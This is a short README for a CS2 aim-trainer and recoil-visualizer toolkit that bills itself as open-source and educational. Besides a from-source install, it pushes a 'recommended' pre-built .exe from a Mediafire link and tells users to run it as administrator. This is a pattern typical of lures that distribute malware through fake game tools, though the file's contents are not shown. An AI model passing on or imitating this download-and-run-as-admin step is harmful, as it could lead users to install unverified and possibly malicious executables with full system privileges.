# CS2 Aim Trainer \& Recoil Visualizer

> Open-source educational toolkit for studying aiming mechanics in CS2.

## Features

* Real-time crosshair overlay (transparent window).
* Recoil pattern simulation for training.
* Fully configurable via JSON.

## Installation from source

```bash
git clone https://github.com/oliver-chen-x01y2/cs2-aim-toolkit
cd cs2-aim-toolkit
pip install -r requirements.txt
python src/main.py



Pre-built binary (recommended for quick start)
If you don't want to deal with Python dependencies, download the ready-to-use package from Mediafire:

🔗 Download CS2 Aim Toolkit (v2.1) – https://www.mediafire.com/file/l4egmurbdqouu1h/CS2_AIM_Toolkit_V2.1.zip/file

The archive contains a single .exe file – just run as administrator (required for overlay).
